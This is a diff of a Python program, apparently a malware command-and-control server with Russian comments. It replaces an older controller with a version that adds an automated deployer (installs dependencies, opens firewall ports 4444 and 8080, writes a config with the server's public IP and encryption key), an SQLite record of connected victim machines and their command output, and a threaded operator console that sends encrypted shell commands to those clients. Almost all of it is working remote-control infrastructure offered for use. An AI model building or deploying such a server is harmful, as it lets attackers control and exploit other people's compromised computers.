@@ -1,242 +1,358 @@
-# 2. advanced_c2_controller.py - Улучшенный C2 контроллер с веб-интерфейсом
+# corrected_c2_server.py - Исправленная версия с правильной структурой
+import os
+import sys
+import subprocess
 import socket
-import threading
 import sqlite3
+import threading
 import logging
+import requests
 from datetime import datetime
-import json
 from cryptography.fernet import Fernet
-import http.server
-import socketserver
 
-# Загрузка конфигурации
-try:
-    from c2_config import *
-except:
-    C2_SERVER = "0.0.0.0"
-    C2_PORT = 4444
-    ENCRYPTION_KEY = Fernet.generate_key()
-
-class C2Database:
-    """База данных для управления клиентами"""
+# === КЛАСС ДЕПЛОЙМЕНТА ===
+class C2Deployer:
     def __init__(self):
-        self.conn = sqlite3.connect('c2_clients.db', check_same_thread=False)
+        self.setup_commands = {
+            'ubuntu': [
+                'apt update && apt upgrade -y',
+                'apt install -y python3 python3-pip git sqlite3',
+                'pip3 install cryptography requests',
+                'ufw allow 4444/tcp',
+                'ufw allow 8080/tcp',
+                'ufw --force enable'
+            ],
+            'centos': [
+                'yum update -y',
+                'yum install -y python3 python3-pip git sqlite3',
+                'pip3 install cryptography requests',
+                'firewall-cmd --permanent --add-port=4444/tcp',
+                'firewall-cmd --permanent --add-port=8080/tcp',
+                'firewall-cmd --reload'
+            ],
+            'kali': [
+                'apt update && apt upgrade -y',
+                'apt install -y python3 python3-pip git sqlite3',
+                'pip3 install cryptography requests',
+                'ufw allow 4444/tcp',
+                'ufw allow 8080/tcp'
+            ]
+        }
+    
+    def detect_os(self):
+        """Определение операционной системы"""
+        if os.name == 'nt':
+            return 'windows'
+        elif os.name == 'posix':
+            try:
+                with open('/etc/os-release', 'r') as f:
+                    content = f.read().lower()
+                    if 'ubuntu' in content:
+                        return 'ubuntu'
+                    elif 'centos' in content:
+                        return 'centos'
+                    elif 'kali' in content:
+                        return 'kali'
+                    elif 'debian' in content:
+                        return 'ubuntu'  # Используем команды Ubuntu для Debian
+            except:
+                pass
+        return 'ubuntu'  # По умолчанию Ubuntu
+    
+    def run_command(self, cmd):
+        """Выполнение команды с проверкой"""
+        try:
+            print(f"[*] Executing: {cmd}")
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            if result.returncode == 0:
+                print(f"[+] Success: {cmd}")
+                return True
+            else:
+                print(f"[-] Failed: {cmd} - {result.stderr}")
+                return False
+        except Exception as e:
+            print(f"[-] Error executing {cmd}: {e}")
+            return False
+    
+    def setup_dependencies(self):
+        """Установка зависимостей"""
+        os_type = self.detect_os()
+        print(f"[*] Detected OS: {os_type}")
+        
+        if os_type not in self.setup_commands:
+            print(f"[-] Unsupported OS: {os_type}")
+            return False
+        
+        print("[+] Installing dependencies...")
+        for cmd in self.setup_commands[os_type]:
+            if not self.run_command(cmd):
+                print(f"[-] Dependency installation failed")
+                return False
+        return True
+    
+    def check_network(self):
+        """Проверка сетевых настроек"""
+        print("[+] Checking network configuration...")
+        
+        # Проверка порта
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            sock.bind(('0.0.0.0', 4444))
+            print("[+] Port 4444 is available")
+            sock.close()
+            return True
+        except OSError:
+            print("[-] Port 4444 is already in use")
+            sock.close()
+            return False
+    
+    def get_public_ip(self):
+        """Получение публичного IP"""
+        try:
+            response = requests.get('https://api.ipify.org', timeout=10)
+            return response.text
+        except:
+            return "YOUR_SERVER_IP"
+    
+    def generate_config(self):
+        """Генерация конфигурационного файла"""
+        public_ip = self.get_public_ip()
+        
+        config_content = f'''# C2 Server Configuration
+C2_SERVER = "0.0.0.0"
+C2_PORT = 4444
+PUBLIC_IP = "{public_ip}"
+ENCRYPTION_KEY = "{Fernet.generate_key().decode()}"
+
+# Database settings
+DB_FILE = "c2_database.db"
+
+# Logging
+LOG_LEVEL = "INFO"
+'''
+        
+        try:
+            with open('c2_config.py', 'w') as f:
+                f.write(config_content)
+            print(f"[+] Configuration file created with public IP: {public_ip}")
+            return True
+        except Exception as e:
+            print(f"[-] Failed to create config: {e}")
+            return False
+    
+    def deploy(self):
+        """Основной метод деплоймента"""
+        print("=== C2 SERVER DEPLOYMENT ===")
+        
+        if not self.setup_dependencies():
+            return False
+        
+        if not self.check_network():
+            return False
+        
+        if not self.generate_config():
+            return False
+        
+        print("\n[+] Deployment completed successfully!")
+        print("[*] Next: Run 'python3 c2_server.py' to start the server")
+        return True
+
+# === КЛАСС БАЗЫ ДАННЫХ ===
+class C2Database:
+    def __init__(self, db_file="c2_database.db"):
+        self.db_file = db_file
+        self.conn = sqlite3.connect(db_file, check_same_thread=False)
         self.create_tables()
     
     def create_tables(self):
+        """Создание таблиц базы данных"""
         cursor = self.conn.cursor()
+        
+        # Таблица клиентов
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS clients (
-                id INTEGER PRIMARY KEY,
-                ip_address TEXT,
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ip_address TEXT UNIQUE,
                 hostname TEXT,
                 os TEXT,
                 first_seen TEXT,
                 last_seen TEXT,
-                status TEXT
+                status TEXT DEFAULT 'online'
             )
         ''')
+        
+        # Таблица команд
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS commands (
-                id INTEGER PRIMARY KEY,
-                client_id INTEGER,
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                client_ip TEXT,
                 command TEXT,
                 result TEXT,
-                timestamp TEXT
+                timestamp TEXT,
+                FOREIGN KEY (client_ip) REFERENCES clients (ip_address)
             )
         ''')
+        
+        self.conn.commit()
+    
+    def add_client(self, ip_address, hostname="Unknown", os="Unknown"):
+        """Добавление клиента в базу"""
+        cursor = self.conn.cursor()
+        current_time = datetime.now().isoformat()
+        
+        cursor.execute('''
+            INSERT OR REPLACE INTO clients 
+            (ip_address, hostname, os, first_seen, last_seen, status)
+            VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM clients WHERE ip_address=?), ?), ?, ?)
+        ''', (ip_address, hostname, os, ip_address, current_time, current_time, 'online'))
+        
+        self.conn.commit()
+    
+    def log_command(self, client_ip, command, result):
+        """Логирование команды"""
+        cursor = self.conn.cursor()
+        cursor.execute('''
+            INSERT INTO commands (client_ip, command, result, timestamp)
+            VALUES (?, ?, ?, ?)
+        ''', (client_ip, command, result, datetime.now().isoformat()))
+        
         self.conn.commit()
 
-class AdvancedC2Controller:
+# === ОСНОВНОЙ C2 СЕРВЕР ===
+class C2Server:
     def __init__(self):
+        # Загрузка конфигурации
+        try:
+            from c2_config import C2_SERVER, C2_PORT, ENCRYPTION_KEY
+            self.host = C2_SERVER
+            self.port = C2_PORT
+            self.encryption_key = ENCRYPTION_KEY.encode()
+        except ImportError:
+            self.host = "0.0.0.0"
+            self.port = 4444
+            self.encryption_key = Fernet.generate_key()
+        
+        self.cipher = Fernet(self.encryption_key)
         self.db = C2Database()
         self.clients = {}
-        self.encryption_key = ENCRYPTION_KEY
-        self.cipher = Fernet(self.encryption_key)
         
         # Настройка логирования
         logging.basicConfig(
-            filename='c2_server.log',
             level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s'
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            handlers=[
+                logging.FileHandler('c2_server.log'),
+                logging.StreamHandler()
+            ]
         )
+        self.logger = logging.getLogger(__name__)
     
-    def start_web_interface(self, port=8080):
-        """Запуск веб-интерфейса для управления"""
-        class C2WebHandler(http.server.SimpleHTTPRequestHandler):
-            def do_GET(self):
-                if self.path == '/dashboard':
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/html')
-                    self.end_headers()
-                    
-                    dashboard_html = """
-                    <html>
-                    <head><title>C2 Dashboard</title></head>
-                    <body>
-                        <h1>C2 Command Center</h1>
-                        <div id="clients"></div>
-                        <script>
-                            fetch('/api/clients')
-                                .then(r => r.json())
-                                .then(data => {
-                                    document.getElementById('clients').innerHTML = 
-                                        JSON.stringify(data, null, 2);
-                                });
-                        </script>
-                    </body>
-                    </html>
-                    """
-                    self.wfile.write(dashboard_html.encode())
-                else:
-                    super().do_GET()
-        
-        web_thread = threading.Thread(target=lambda: socketserver.TCPServer(
-            ("", port), C2WebHandler).serve_forever())
-        web_thread.daemon = True
-        web_thread.start()
-        print(f"[+] Web interface started on port {port}")
-
-    def handle_client(self, client_socket, address):
+    def handle_client(self, client_socket, client_address):
         """Обработка подключения клиента"""
+        client_ip = client_address[0]
+        self.logger.info(f"New connection from {client_ip}")
+        
         try:
-            # Обмен ключами
-            client_key = client_socket.recv(44)
-            client_cipher = Fernet(client_key)
-            
             # Регистрация клиента
-            client_info = {
-                'ip': address[0],
-                'connect_time': datetime.now().isoformat(),
-                'cipher': client_cipher
+            self.db.add_client(client_ip)
+            self.clients[client_ip] = {
+                'socket': client_socket,
+                'connected_at': datetime.now(),
+                'cipher': self.cipher
             }
-            self.clients[address[0]] = client_info
             
-            logging.info(f"New client connected: {address[0]}")
-            print(f"[+] Client connected: {address[0]}")
+            print(f"\n[+] New client connected: {client_ip}")
+            print(f"[*] Total clients: {len(self.clients)}")
             
             while True:
-                # Получение команды от оператора
-                command = input(f"C2[{address[0]}]> ")
-                
-                if command == "exit":
-                    break
-                elif command == "info":
-                    # Запрос информации о системе
-                    encrypted_cmd = client_cipher.encrypt(b"sysinfo")
-                    client_socket.send(encrypted_cmd)
+                # Ожидание команды от оператора
+                if client_ip in self.clients:
+                    command = input(f"C2[{client_ip}]> ").strip()
                     
-                    response = client_socket.recv(65536)
-                    if response:
-                        decrypted = client_cipher.decrypt(response)
-                        print(decrypted.decode())
-                
-                elif command.startswith("cmd "):
-                    # Выполнение CMD команды
-                    cmd_text = command[4:]
-                    encrypted_cmd = client_cipher.encrypt(f"cmd {cmd_text}".encode())
-                    client_socket.send(encrypted_cmd)
+                    if command.lower() in ['exit', 'quit']:
+                        break
+                    elif command == '':
+                        continue
                     
-                    response = client_socket.recv(65536)
-                    if response:
-                        decrypted = client_cipher.decrypt(response)
-                        print(decrypted.decode())
-                
-                else:
-                    # Стандартная команда
-                    encrypted_cmd = client_cipher.encrypt(command.encode())
-                    client_socket.send(encrypted_cmd)
+                    # Отправка команды клиенту
+                    encrypted_command = self.cipher.encrypt(command.encode())
+                    client_socket.send(encrypted_command)
                     
-                    response = client_socket.recv(65536)
-                    if response:
-                        decrypted = client_cipher.decrypt(response)
-                        print(decrypted.decode())
+                    # Получение ответа
+                    response_data = client_socket.recv(1024 * 1024)  # 1MB buffer
+                    if response_data:
+                        try:
+                            decrypted_response = self.cipher.decrypt(response_data)
+                            response_text = decrypted_response.decode('utf-8', errors='ignore')
+                            print(f"Response from {client_ip}:\n{response_text}")
+                            
+                            # Логирование в базу
+                            self.db.log_command(client_ip, command, response_text[:1000])  # Ограничение длины
+                        except Exception as e:
+                            print(f"Decryption error: {e}")
+                    else:
+                        print("No response from client")
                         
         except Exception as e:
-            logging.error(f"Client {address[0]} error: {e}")
+            self.logger.error(f"Error with client {client_ip}: {e}")
         finally:
-            if address[0] in self.clients:
-                del self.clients[address[0]]
+            # Очистка при отключении
+            if client_ip in self.clients:
+                del self.clients[client_ip]
             client_socket.close()
-
-    def start_server(self):
-        """Запуск основного сервера"""
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.logger.info(f"Client {client_ip} disconnected")
+            print(f"[-] Client {client_ip} disconnected")
+    
+    def start(self):
+        """Запуск C2 сервера"""
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
         try:
-            server.bind((C2_SERVER, C2_PORT))
-            server.listen(10)
+            server_socket.bind((self.host, self.port))
+            server_socket.listen(5)
             
-            print(f"[*] Advanced C2 Server started on {C2_SERVER}:{C2_PORT}")
-            print("[*] Waiting for connections...")
-            logging.info(f"C2 Server started on port {C2_PORT}")
-            
-            # Запуск веб-интерфейса
-            self.start_web_interface()
+            print(f"[*] C2 Server started on {self.host}:{self.port}")
+            print("[*] Waiting for client connections...")
+            print("[*] Encryption key:", self.encryption_key.decode())
+            self.logger.info(f"C2 Server started on port {self.port}")
             
             while True:
-                client_socket, address = server.accept()
+                client_socket, client_address = server_socket.accept()
                 
-                # Запуск отдельного потока для каждого клиента
+                # Запуск обработчика в отдельном потоке
                 client_thread = threading.Thread(
-                    target=self.handle_client, 
-                    args=(client_socket, address)
+                    target=self.handle_client,
+                    args=(client_socket, client_address)
                 )
                 client_thread.daemon = True
                 client_thread.start()
                 
+        except KeyboardInterrupt:
+            print("\n[*] Shutting down server...")
         except Exception as e:
-            logging.error(f"Server error: {e}")
+            self.logger.error(f"Server error: {e}")
             print(f"[-] Server error: {e}")
         finally:
-            server.close()
+            server_socket.close()
 
-# 3. deployment_check.py - Скрипт проверки развертывания
-def check_deployment():
-    """Проверка корректности развертывания"""
-    checks = [
-        ("Port 4444 available", lambda: check_port(4444)),
-        ("Python dependencies", lambda: check_dependencies()),
-        ("External connectivity", lambda: check_external_connectivity()),
-        ("Encryption keys", lambda: check_encryption())
-    ]
-    
-    print("=== DEPLOYMENT CHECK ===")
-    for check_name, check_func in checks:
-        try:
-            result = check_func()
-            print(f"[✓] {check_name}: OK")
-        except Exception as e:
-            print(f"[✗] {check_name}: FAILED - {e}")
-
-def check_port(port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        sock.bind(('0.0.0.0', port))
-        return True
-    except OSError:
-        return False
-    finally:
-        sock.close()
-
-def check_dependencies():
-    required = ['cryptography', 'fernet', 'socket', 'threading']
-    for dep in required:
-        try:
-            __import__(dep)
-        except ImportError:
-            return False
-    return True
-
+# === ЗАПУСК ПРОГРАММЫ ===
 if __name__ == "__main__":
-    # Запуск автоматического деплоймента
-    deployer = C2Deployer()
-    deployer.main()
-    
-    # Проверка развертывания
-    check_deployment()
-    
-    # Запуск сервера
-    controller = AdvancedC2Controller()
-    controller.start_server()
+    if len(sys.argv) > 1 and sys.argv[1] == "deploy":
+        # Режим деплоймента
+        deployer = C2Deployer()
+        deployer.deploy()
+    else:
+        # Проверка конфигурации
+        if not os.path.exists('c2_config.py'):
+            print("[!] Configuration file not found. Running deployment...")
+            deployer = C2Deployer()
+            if deployer.deploy():
+                print("[+] Deployment successful. Starting server...")
+            else:
+                print("[-] Deployment failed. Please check errors above.")
+                sys.exit(1)
+        
+        # Запуск сервера
+        server = C2Server()
+        server.start()
